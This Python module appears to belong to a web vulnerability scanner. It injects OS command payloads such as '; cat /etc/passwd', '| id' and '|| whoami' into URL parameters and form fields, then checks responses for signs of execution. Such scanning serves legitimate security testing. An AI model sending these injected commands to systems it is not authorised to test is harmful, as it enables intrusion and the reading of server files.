from utils.colors import Colors

class CmdInjectionScanner:
    def __init__(self, requester, reporter):
        self.req = requester
        self.reporter = reporter
        self.payloads = [
            "; cat /etc/passwd",
            "| id",
            "|| whoami",
            "`id`",
            "& netstat -an"
        ]
        self.success_indicators = [
            "root:x:0:0:",  
            "uid=",         
            "www-data"      
        ]

    def is_vulnerable(self, response_text):
        for indicator in self.success_indicators:
            if indicator in response_text:
                return True
        return False

    def scan_url(self, url):
        if "?" not in url:
            return False
            
        base_url = url.split("?")[0]
        params = url.split("?")[1].split("&")
        
        for payload in self.payloads:
            for i in range(len(params)):
                test_params = params.copy()
                param_name = test_params[i].split("=")[0]
                test_params[i] = f"{param_name}={payload}"
                
                test_url = f"{base_url}?{'&'.join(test_params)}"
                response = self.req.get(test_url)
                
                if response and self.is_vulnerable(response.text):
                    print(f"{Colors.VULN} OS Command Injection (RCE) found at: {test_url}")
                    self.reporter.add_vulnerability("OS Command Injection", test_url, f"Payload: {payload}")
                    return True
        return False

    def scan_form(self, form):
        target_url = form['action']
        method = form['method']
        
        for payload in self.payloads:
            data = {}
            for input_tag in form['inputs']:
                input_name = input_tag['name']
                data[input_name] = payload
            
            if method == 'post':
                response = self.req.post(target_url, data=data)
            else:
                response = self.req.get(target_url, params=data)
                
            if response and self.is_vulnerable(response.text):
                print(f"{Colors.VULN} OS Command Injection (RCE) found in Form at: {form['url']}")
                self.reporter.add_vulnerability("OS Command Injection (Form)", form['url'], f"Payload: {payload} | Data: {data}")
                return True
        return False